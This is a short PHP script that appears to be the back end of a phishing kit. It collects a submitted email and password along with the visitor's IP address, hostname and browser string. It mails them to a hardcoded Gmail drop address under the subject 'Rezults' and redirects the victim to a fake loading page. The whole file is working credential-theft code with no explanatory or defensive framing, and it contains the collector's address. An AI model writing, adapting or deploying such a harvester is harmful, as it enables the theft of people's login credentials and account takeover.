<?php

$email = $_REQUEST["email"];
$password = $_REQUEST["password"];


if (getenv(HTTP_CLIENT_IP)){
$ip=getenv(HTTP_CLIENT_IP);
}
else {
$ip=getenv(REMOTE_ADDR);
}

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$browser = $_SERVER['HTTP_USER_AGENT'];

$data=" 
----------
Email : $email
Password : $password


------------------
$ip
$hostname
$browser
------------------
";

$subj = "Rezults";

$recipient1 = "silvijja.beadparadise@gmail.com";




mail($recipient1 , $subj , $data);

header("Location: loading_doc.html");

?>

